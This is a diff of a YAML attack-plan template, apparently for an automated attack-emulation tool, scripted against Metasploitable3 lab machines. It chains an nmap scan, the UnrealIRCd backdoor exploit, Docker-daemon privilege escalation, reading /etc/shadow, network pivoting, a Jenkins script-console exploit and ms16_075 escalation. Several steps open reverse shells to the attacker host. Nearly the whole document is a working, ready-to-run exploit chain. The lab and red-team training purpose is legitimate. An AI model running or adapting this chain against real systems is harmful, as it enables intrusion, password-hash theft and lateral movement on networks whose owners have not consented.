@@ -1,272 +1,239 @@
 ---
 # This template contains an attack scenario that is compatible with the *metasploitable3*.
+#
 # To use it, you must have *Vagrant* and *Virtualbox* installed. For more information see the `Vagrantfile`.
 # To run the Vagrant configuration use `vagrant up` in the same directory as the `Vagrantfile`.
+#
 # Make sure the parameters in the `inventory.yml` file are correct!
+#
 # In the current template we first scan the network with the ubuntu machine, get session using the IRCD backdoor, 
 # and get root privileges using the Docker daemon exploit. Afterwards we get data from the machine.
 # Next we set up routing tables, and move to the second network. There we find a Windows machine, exploit it using 
 # a known Jenkins vulnerability, get root access using ms16_075_reflection_juicy, and gather data about the system.
-# Required modules: metasploit, command, nmap.
 
-plan:
-  name: Metasploitable3 example
-  owner: Cryton
-  stages:
-    # Stage 1
-    - name: network-one-information-gathering
-      trigger_type: delta
-      trigger_args:
-        seconds: 0
-      steps:
-      - name: ubuntu-nmap-scan
+name: Metasploitable3 example
+stages:
+  # Stage 1
+  network-one-information-gathering:
+    steps:
+      ubuntu-nmap-scan:
         is_init: true
-        step_type: worker/execute
-        meta:
+        metadata:
           action: Scan the first network (for faster scans we use only the machine ip) for common ports
           target: Ubuntu
+        module: nmap
         arguments:
-          module: nmap
-          module_arguments:
-            target: {{ ubuntu.host }}
-            options: -T4
+          target: {{ ubuntu.host }}
+          options: -T4
 
-    # Stage 2
-    - name: exploit-ubuntu
-      trigger_type: delta
-      trigger_args:
-        seconds: 10
-      depends_on:
-        - network-one-information-gathering
-      steps:
-      - name: exploit-ircd
+  # Stage 2
+  exploit-ubuntu:
+    type: delta
+    arguments:
+      seconds: 10
+    depends_on:
+      - network-one-information-gathering
+    steps:
+      exploit-ircd:
         is_init: true
-        step_type: worker/execute
-        meta:
+        metadata:
           target: Ubuntu
           action: Exploit IRCD backdoor
+        module: metasploit
         arguments:
-          create_named_session: session-ircd
-          module: metasploit
-          module_arguments:
-            module_name: unix/irc/unreal_ircd_3281_backdoor
-            datastore:
-              PAYLOAD: cmd/unix/reverse_perl
-              RHOSTS: {{ ubuntu.host }}
-              RPORT: 6697
-              LHOST: {{ attacker.host }}
-              LPORT: 4445
+          module_name: unix/irc/unreal_ircd_3281_backdoor
+          datastore:
+            PAYLOAD: cmd/unix/reverse_perl
+            RHOSTS: {{ ubuntu.host }}
+            RPORT: 6697
+            LHOST: {{ attacker.host }}
+            LPORT: 4445
         next:
           - type: result
             value: ok
             step: exploit-dockerd-privesc
 
-      - name: exploit-dockerd-privesc
-        step_type: worker/execute
-        meta:
+      exploit-dockerd-privesc:
+        metadata:
           target: Ubuntu
           action: Privilege escalation
+        module: metasploit
         arguments:
-          create_named_session: session-ubuntu-root
-          module: metasploit
-          module_arguments:
-            module_name: linux/local/docker_daemon_privilege_escalation
-            datastore:
-              SESSION: $exploit-ircd.session_id
-              PAYLOAD: linux/x64/meterpreter/reverse_tcp
-              LHOST: {{ attacker.host }}
-              LPORT: 4446
+          module_name: linux/local/docker_daemon_privilege_escalation
+          datastore:
+            SESSION: $exploit-ircd.session_id
+            PAYLOAD: linux/x64/meterpreter/reverse_tcp
+            LHOST: {{ attacker.host }}
+            LPORT: 4446
 
-    # Stage 3
-    - name: gather-data-from-ubuntu
-      trigger_type: delta
-      trigger_args:
-        seconds: 20
-      depends_on:
-      - exploit-ubuntu
-      steps:
-        - name: ubuntu-get-system-info
-          step_type: worker/execute
-          is_init: true
-          meta:
-            target: Ubuntu
-            action: Get system info
-          arguments:
-            use_named_session: session-ubuntu-root
-            module: command
-            module_arguments:
-              command: sysinfo
-              force_shell: false
-          next:
-            - type: result
-              value: ok
-              step: ubuntu-get-etc-shadow
+  # Stage 3
+  gather-data-from-ubuntu:
+    type: delta
+    arguments:
+      seconds: 20
+    depends_on:
+    - exploit-ubuntu
+    steps:
+      ubuntu-get-system-info:
+        is_init: true
+        metadata:
+          target: Ubuntu
+          action: Get system info
+        module: command
+        arguments:
+          session_id: $exploit-dockerd-privesc.session_id
+          command: sysinfo
+          force_shell: false
+        next:
+          - type: result
+            value: ok
+            step: ubuntu-get-etc-shadow
 
-        - name: ubuntu-get-etc-shadow
-          meta:
-            target: Ubuntu
-            action: Get /etc/shadow
-          step_type: worker/execute
-          arguments:
-            use_named_session: session-ubuntu-root
-            module: command
-            module_arguments:
-              command: cat /etc/shadow
-          next:
-            - type: result
-              value: ok
-              step: ubuntu-get-process-list
+      ubuntu-get-etc-shadow:
+        metadata:
+          target: Ubuntu
+          action: Get /etc/shadow
+        module: command
+        arguments:
+          session_id: $exploit-dockerd-privesc.session_id
+          command: cat /etc/shadow
+        next:
+          - type: result
+            value: ok
+            step: ubuntu-get-process-list
 
-        - name: ubuntu-get-process-list
-          meta:
-            target: Ubuntu
-            action: Get list of running processes
-          step_type: worker/execute
-          arguments:
-            use_named_session: session-ubuntu-root
-            module: command
-            module_arguments:
-              command: ps
+      ubuntu-get-process-list:
+        metadata:
+          target: Ubuntu
+          action: Get list of running processes
+        module: command
+        arguments:
+          session_id: $exploit-dockerd-privesc.session_id
+          command: ps
 
-    # Stage 4
-    - name: network-pivoting
-      trigger_type: delta
-      trigger_args:
-        seconds: 25
-      depends_on:
-      - gather-data-from-ubuntu
-      steps:
-        - name: get-interfaces
-          is_init: true
-          step_type: worker/execute
-          meta:
-            target: Ubuntu
-            action: Get host interfaces
-          arguments:
-            use_named_session: session-ubuntu-root
-            module: command
-            module_arguments:
-              command: ifconfig
-          next:
-            - type: result
-              value: ok
-              step: update-msf-routing-table
+  # Stage 4
+  network-pivoting:
+    type: delta
+    arguments:
+      seconds: 25
+    depends_on:
+    - gather-data-from-ubuntu
+    steps:
+      get-interfaces:
+        is_init: true
+        metadata:
+          target: Ubuntu
+          action: Get host interfaces
+        module: command
+        arguments:
+          session_id: $exploit-dockerd-privesc.session_id
+          command: ifconfig
+        next:
+          - type: result
+            value: ok
+            step: update-msf-routing-table
 
-        - name: update-msf-routing-table
-          meta:
-            target: Ubuntu
-            action: Update MSF routing table
-          step_type: worker/execute
-          arguments:
-            module: metasploit
-            module_arguments:
-              module_name: multi/manage/autoroute
-              datastore:
-                CMD: autoadd
-                NETMASK: 255.255.255.0
-                SESSION: $exploit-dockerd-privesc.session_id
+      update-msf-routing-table:
+        metadata:
+          target: Ubuntu
+          action: Update MSF routing table
+        module: metasploit
+        arguments:
+          module_name: multi/manage/autoroute
+          datastore:
+            CMD: autoadd
+            NETMASK: 255.255.255.0
+            SESSION: $exploit-dockerd-privesc.session_id
 
-    # Stage 5
-    - name: network-two-information-gathering
-      trigger_type: delta
-      trigger_args:
-        seconds: 30
-      depends_on:
-      - network-pivoting
-      steps:
-      - name: scan-windows-host
-        meta:
+  # Stage 5
+  network-two-information-gathering:
+    type: delta
+    arguments:
+      seconds: 30
+    depends_on:
+    - network-pivoting
+    steps:
+      scan-windows-host:
+        metadata:
           target: Windows
           action: Scan the second network (for faster scans we use only the machine ip) for desired ports
-        step_type: worker/execute
         is_init: true
+        module: metasploit
         arguments:
-          module: metasploit
-          module_arguments:
-            module_name: scanner/portscan/tcp
-            datastore:
-              PORTS: 20-25,53,80,135,443,3389,8000,8080,8443,8888
-              RHOSTS: {{ windows.host }}
-              TIMEOUT: 50
+          module_name: scanner/portscan/tcp
+          datastore:
+            PORTS: 20-25,53,80,135,443,3389,8000,8080,8443,8888
+            RHOSTS: {{ windows.host }}
+            TIMEOUT: 50
 
-    # Stage 6
-    - name: exploit-windows
-      trigger_type: delta
-      trigger_args:
-        seconds: 40
-      depends_on:
-      - network-two-information-gathering
-      steps:
-        - name: exploit-jenkins
-          meta:
-            target: Windows
-            action: Exploit Jenkins service
-          step_type: worker/execute
-          is_init: true
-          arguments:
-            create_named_session: session-jenkins
-            module: metasploit
-            module_arguments:
-              module_name: multi/http/jenkins_script_console
-              datastore:
-                RHOSTS: {{ windows.host }}
-                RPORT: 8484
-                TARGETURI: /
-                PAYLOAD: windows/meterpreter/reverse_tcp
-                LHOST: {{ attacker.host }}
-                LPORT: 4447
-          next:
-            - type: result
-              value: ok
-              step: exploit-ms16-reflection-juicy
+  # Stage 6
+  exploit-windows:
+    type: delta
+    arguments:
+      seconds: 40
+    depends_on:
+    - network-two-information-gathering
+    steps:
+      exploit-jenkins:
+        metadata:
+          target: Windows
+          action: Exploit Jenkins service
+        is_init: true
+        module: metasploit
+        arguments:
+          module_name: multi/http/jenkins_script_console
+          datastore:
+            RHOSTS: {{ windows.host }}
+            RPORT: 8484
+            TARGETURI: /
+            PAYLOAD: windows/meterpreter/reverse_tcp
+            LHOST: {{ attacker.host }}
+            LPORT: 4447
+        next:
+          - type: result
+            value: ok
+            step: exploit-ms16-reflection-juicy
 
-        - name: exploit-ms16-reflection-juicy
-          meta:
-            target: Windows
-            action: Privilege escalation
-          step_type: worker/execute
-          arguments:
-            create_named_session: session-windows-root
-            module: metasploit
-            module_arguments:
-              module_name: windows/local/ms16_075_reflection_juicy
-              datastore:
-                SESSION: $exploit-jenkins.session_id
-                PAYLOAD: windows/meterpreter/reverse_tcp
-                LHOST: {{ attacker.host }}
-                LPORT: 4448
+      exploit-ms16-reflection-juicy:
+        metadata:
+          target: Windows
+          action: Privilege escalation
+        module: metasploit
+        arguments:
+          module_name: windows/local/ms16_075_reflection_juicy
+          datastore:
+            SESSION: $exploit-jenkins.session_id
+            PAYLOAD: windows/meterpreter/reverse_tcp
+            LHOST: {{ attacker.host }}
+            LPORT: 4448
 
-    # Stage 7
-    - name: gather-data-from-windows
-      trigger_type: delta
-      trigger_args:
-        seconds: 60
-      depends_on:
-      - exploit-windows
-      steps:
-        - name: windows-whoami
-          is_init: true
-          step_type: worker/execute
-          meta:
-            target: Windows
-            action: Get user and its privileges
-          arguments:
-            use_named_session: session-windows-root
-            module: command
-            module_arguments:
-              command: whoami /all
-          next:
-            - type: result
-              value: ok
-              step: get-tasklist
+  # Stage 7
+  gather-data-from-windows:
+    type: delta
+    arguments:
+      seconds: 60
+    depends_on:
+    - exploit-windows
+    steps:
+      windows-whoami:
+        is_init: true
+        metadata:
+          target: Windows
+          action: Get user and its privileges
+        module: command
+        arguments:
+          session_id: $exploit-ms16-reflection-juicy.session_id
+          command: whoami /all
+        next:
+          - type: result
+            value: ok
+            step: get-tasklist
 
-        - name: get-tasklist
-          step_type: worker/execute
-          meta:
-            target: Windows
-            action: Get tasklist
-          arguments:
-            use_named_session: session-windows-root
-            module: command
-            module_arguments:
-              command: tasklist
+      get-tasklist:
+        metadata:
+          target: Windows
+          action: Get tasklist
+        module: command
+        arguments:
+          session_id: $exploit-ms16-reflection-juicy.session_id
+          command: tasklist
